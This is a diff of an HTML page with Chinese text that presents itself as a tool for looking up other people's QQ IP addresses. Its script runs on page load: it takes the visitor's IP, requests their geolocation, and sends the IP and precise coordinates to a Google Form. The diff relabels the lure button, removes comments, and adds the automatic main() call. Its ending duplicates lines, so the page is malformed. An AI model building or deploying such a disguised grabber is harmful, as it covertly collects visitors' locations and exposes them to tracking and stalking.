@@ -17,7 +17,7 @@
   <p id="ipOnlyResult"></p>
 
   <button onclick="window.open('https://www.bilibili.com/video/BV1GJ411x7h7/?spm_id_from=333.337.search-card.all.click&vd_source=7504f18c191405de66c8b613d77dfea9', '_blank')">
-    查询他人IP
+    查询他人QQIP功能
   </button>
 
   <script>
@@ -27,7 +27,6 @@
     const entryLon = "entry.1434358418";
     const entryLat = "entry.99996352";
 
-    // 仅显示IP按钮对应函数
     async function getIP() {
       const output = document.getElementById('ipOnlyResult');
       output.textContent = "查询中……";
@@ -40,7 +39,6 @@
       }
     }
 
-    // 自动获取IP的函数（给main用）
     async function fetchIP() {
       try {
         let res = await fetch('https://api.ipify.org?format=json');
@@ -51,9 +49,7 @@
       }
     }
 
-    // 读取json文件匹配IP归属国家
     async function fetchCountryFromIP(ip) {
-      // 把IP转成数字便于比较
       const ipNum = ip.split('.').reduce((acc, val) => acc * 256 + Number(val), 0);
       const response = await fetch('ip_country_ranges.json');
       const data = await response.json();
@@ -66,7 +62,6 @@
       return '未知国家';
     }
 
-    // 上传数据到谷歌表单
     function postToGoogleForm(ip, lon, lat) {
       const formData = new FormData();
       formData.append(entryIP, ip);
@@ -80,7 +75,6 @@
       }).catch(console.error);
     }
 
-    // 页面加载后自动执行
     async function main() {
       const ip = await fetchIP();
       document.getElementById('info').textContent = "IP: " + ip + "，等待定位中...";
@@ -95,15 +89,28 @@
       }
 
       navigator.geolocation.getCurrentPosition(position => {
-        const lat = position.coords.latitude.toFixed(6);
-        const lon = position.coords.longitude.toFixed(6);
-        document.getElementById('info').textContent += `\n经度: ${lon}\n纬度: ${lat}`;
-        postToGoogleForm(ip, lon, lat);
+        const latNum = position.coords.latitude;
+        const lonNum = position.coords.longitude;
+
+        const latDir = latNum >= 0 ? 'N' : 'S';
+        const lonDir = lonNum >= 0 ? 'E' : 'W';
+
+        const lat = Math.abs(latNum).toFixed(6);
+        const lon = Math.abs(lonNum).toFixed(6);
+
+        document.getElementById('info').textContent += `\n经度: ${lon}${lonDir}\n纬度: ${lat}${latDir}`;
+        postToGoogleForm(ip, lonNum.toFixed(6), latNum.toFixed(6));
       }, err => {
         document.getElementById('info').textContent += `\n定位失败：${err.message}`;
         postToGoogleForm(ip, "失败", "失败");
       }, {timeout: 15000});
     }
+
+    main();
+  </script>
+</body>
+</html>
+
 
     main();
   </script>
